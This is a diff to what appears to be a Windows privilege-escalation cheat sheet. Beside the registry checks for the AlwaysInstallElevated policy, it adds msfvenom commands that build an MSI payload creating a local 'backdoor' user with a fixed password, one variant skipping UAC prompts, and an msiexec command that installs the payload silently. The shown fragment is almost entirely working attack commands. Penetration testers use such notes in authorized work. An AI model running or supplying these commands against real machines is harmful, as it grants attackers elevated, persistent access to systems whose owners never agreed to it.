@@ -36,6 +36,9 @@ mountvol
 ```
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
+$ msiexec /quiet /qn /i C:\evil.msi
 ```
 
 ###### Bypass UAC
